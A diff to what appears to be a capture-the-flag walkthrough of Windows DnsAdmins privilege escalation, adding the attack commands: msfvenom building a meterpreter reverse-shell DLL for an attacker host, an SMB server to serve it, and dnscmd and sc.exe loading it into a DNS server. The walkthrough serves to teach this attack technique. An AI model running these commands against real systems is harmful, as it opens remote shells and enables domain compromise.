@@ -55,6 +55,10 @@ So the way this exploit works is, you need to craft a specific .dll which can be
 
 Let's craft our dll payload using msfvenon in order to generate a reverse shell back to us. For this i will also setup the metasploit reverse shell, an smbserver for the AD to download the dll file:
 
+msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.121 LPORT=8080 -f dll > shell-cmd.dll
+
+smbserver.py share /tmp
+
 <img width="1202" alt="Screenshot 2019-12-10 at 03 13 21" src="https://user-images.githubusercontent.com/47299364/70489621-990bf580-1afc-11ea-9462-9ad0b15944b6.png">
 
 <img width="1402" alt="Screenshot 2019-12-10 at 03 13 41" src="https://user-images.githubusercontent.com/47299364/70489637-a628e480-1afc-11ea-98fb-94f09b371006.png">
@@ -62,6 +66,10 @@ Let's craft our dll payload using msfvenon in order to generate a reverse shell 
 <img width="711" alt="Screenshot 2019-12-10 at 03 14 06" src="https://user-images.githubusercontent.com/47299364/70489658-b17c1000-1afc-11ea-81cf-7934528b481a.png">
 
 Once all of this is setup, we just need to run the dnscmd command in the server and restart the dns service too:
+
+dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.15.121\share\shell-cmd.dll
+
+sc.exe \\10.10.10.169 start dns
 
 <img width="934" alt="Screenshot 2019-12-10 at 03 14 33" src="https://user-images.githubusercontent.com/47299364/70489718-d2dcfc00-1afc-11ea-8d3b-8a016e803d1c.png">
 
